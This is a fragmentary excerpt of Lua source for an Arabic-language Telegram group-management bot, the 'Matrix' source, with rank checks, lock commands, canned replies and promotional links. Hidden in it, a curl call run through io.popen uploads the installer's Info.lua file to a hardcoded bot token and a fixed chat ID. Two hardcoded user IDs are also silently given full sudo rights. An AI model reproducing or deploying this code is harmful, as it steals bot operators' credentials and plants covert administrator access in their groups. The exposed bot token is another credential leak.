...
if res ~= 200 then
print('\27[0;31m•━═━═━═『𝚖𝚊𝚝𝚛𝚒𝚡』═━═━═━•\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na•━═━═━═『𝚖𝚊𝚝𝚛𝚒𝚡』═━═━═━•\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m•━═━═━═『𝚖𝚊𝚝𝚛𝚒𝚡』═━═━═━• ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
sudo_users = {SUDO,1845655031,1858220633}   
...
if tonumber(user_id) == tonumber(1845655031) then  
var = true 
elseif tonumber(user_id) == tonumber(1858220633) then
var = true  
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'ماتريكس'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝒔𝒐𝒖𝒓𝒄𝒆 𝒎𝒂𝒕𝒓𝒊𝒙")  
...
local curl = 'curl "'..'https://api.telegram.org/bot1833028811:AAFhC73CuTwejU9QMzADwW7AAojzK0EQOII/sendDocument'..'" -F "chat_id='.. 1845655031 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_, msg.id_,' ∭ اصدار سورس ماتريكس { s: 6.7}')
end
...
{{text = 'قناه السورس️️', url="t.me/UU_matrixx"}}, 
} 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'تواصل السورس 📬', url="t.me/hX6bot"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_,0," ∭ العضو : {["..data.first_name_.."](T.ME/UU_matrixx)}\n ∭ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ∭ عذرا ⇐ {["..data.first_name_.."](T.ME/UU_matrixx)}\n ∭ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
keyboard.inline_keyboard = {
{
{text = 'Mido elkbeer selvador🌹', url = "t.me/uu_mido"},
},
{
{text = '𝐌𝐄𝐃𝐎 𝐄𝐋𝐒𝐎𝐆𝐄𝐑🌹', url = "t.me/Enginner_mido"},
},
{
{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐌𝐀𝐓𝐑𝐈𝐗', url = "t.me/UU_matrixx"},
}
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=t.me/UU_matrixx/99=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
local Text = [[
 ∭ اهلا بك في سورس ماتريكس الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني  ∭ 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'مطورين السورس⚙',url="t.me/UU_metoren"}},
{{text = 'قناه السورس 🧭 ', url="t.me/UU_matrixx"}},
{{text = 'تواصل السورس 📬',url="t.me/uu_mido123BOT"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'ميدو'  then
local Text = [[
ميدو مبرمج سورس ماتريكس للتواصل معه اتبع الزر الاسفل 👇💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'mido🌺',url="t.me/uu_mido"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/uu_mido&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'ميدو الصغير'  then
local Text = [[
ميدو الصغير  مالك سورس ماتريكس للتواصل معه اتبع الزر الاسفل 👇💕.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'mido elsoger🌺',url="t.me/Enginner_mido"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Enginner_mido&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
if text == "بوستات" or text == "حكمه" or text == "قصيده" then 
local TWEET_Msg = { 
...
local Text = [[ 
[TWL](t.me/uu_mido123BOT)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'تواصل السورس 📬', url="t.me/UU_metoren"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطور السورس⚙', url="t.me/UU_metoren"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = [[  
 اهلا في قائمه الالعاب المتطوره سورس ماتريكس🚌
...
elseif text == 'قفل ماتريكسرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ∭ بواسطه ⇐ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'textchuser')..') \n ∭ تـم قفـل ماتريكسرسيه ')
end,nil)   
...
elseif text == 'فتح ماتريكسرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ∭ بواسطه ⇐ ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'textchuser')..') \n ∭ تـم فـتح ماتريكسرسيه ')
end,nil)   
...
if text == ("مسح قائمه ماتريكس") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ∭ تم مسح قائمه ماتريكس')
return false
end

if text == 'قائمه ماتريكس' and Sudo(msg) then
...
if #list == 0 then
t = " ∭ لا يوجد احد في قائمه ماتريكس"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع ماتريكس") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ماتريكس @(.*)$") and Sudo(msg) then
local username = text:match("^رفع ماتريكس @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع ماتريكس (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع ماتريكس (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل ماتريكس") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ماتريكس @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل ماتريكس @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل ماتريكس (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل ماتريكس (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == "بوت" then
local Namebot = (database:get(bot_id..'Name:Bot') or 'ماتركس') 
local DRAGON_Msg = { 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = ':T::O: :A::S::K:', url="https://t.me/UU_metoren"}},
 {{text = 'بوت التواصل', url="t.me/uu_mido123BOT"}},
 {{text = 'سورس ماتريكس', url="https://t.me/UU_matrixx"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=t.me/UU_matrixx/98&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒔𝒐𝒖𝒓𝒄𝒆 𝒎𝒂𝒕𝒓𝒊𝒙.',url="t.me/UU_matrixx"}},
}
local msg_id = msg.id_/2097152/0.5
...
end --الكود حصري سورس ماتريكس يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ماتريكس').." غادر" or text == 'غادر' then  
...
if text == 'بوت' then
Namebot = (database:get(bot_id..'Name:Bot') or 'ماتريكس')
...
send(msg.chat_id_,msg.id_, '[نت مبرمج السورس يروحي😊](t.me/mickeybott)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/mickeybott)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/mickeybott)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/mickeybott)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/mickeybott)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/mickeybott)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/mickeybott)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/mickeybott)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/mickeybott)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/mickeybott)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/mickeybott)')
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/UU_matrixx)') 
return false
end

if text == 'هاي' or text == 'هيي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/UU_matrixx)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/UU_matrixx)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/UU_matrixx)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/UU_matrixx)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/UU_matrixx)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/UU_matrixx)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/UU_matrixx)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/UU_matrixx)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/UU_matrixx)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/UU_matrixx)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/UU_matrixx)') 
return false
end
end
end
...
if text == 'تيييغير الايدي' and Manager(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠??𝚂𝙶 𖨈 #msgs 𖥲 .
...
local Teext =[[
•━═━═━═『𝚖𝚊𝚝𝚛𝚒𝚡』═━═━═━•
اهلا بك في مميزات سورس ماتريكس.🔱
•━═━═━═『𝚖𝚊𝚝𝚛𝚒𝚡』═━═━═━•
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'ماتريكس')
